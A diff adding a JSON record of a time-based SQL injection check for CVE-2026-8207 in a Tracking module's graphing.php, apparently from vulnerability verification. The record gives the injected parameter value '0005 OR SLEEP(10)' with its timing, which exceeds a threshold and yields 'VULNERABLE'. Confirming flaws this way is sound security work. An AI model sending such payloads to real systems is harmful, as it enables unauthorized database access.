@@ -1,0 +1,24 @@
+{
+  "case": "CVE-2026-8207",
+  "sink": "modules/Tracking/graphing.php SQL construction from gibbonDepartmentIDs[]",
+  "baseline": {
+    "department_ids": [
+      "0005"
+    ],
+    "http_status": 200,
+    "seconds": 3.0,
+    "response_bytes": 140090
+  },
+  "injected": {
+    "department_ids": [
+      "0005",
+      "0005 OR SLEEP(10)"
+    ],
+    "http_status": 200,
+    "seconds": 23.52,
+    "response_bytes": 140090
+  },
+  "delta_seconds": 20.51,
+  "threshold_seconds": 8.0,
+  "result": "VULNERABLE"
+}
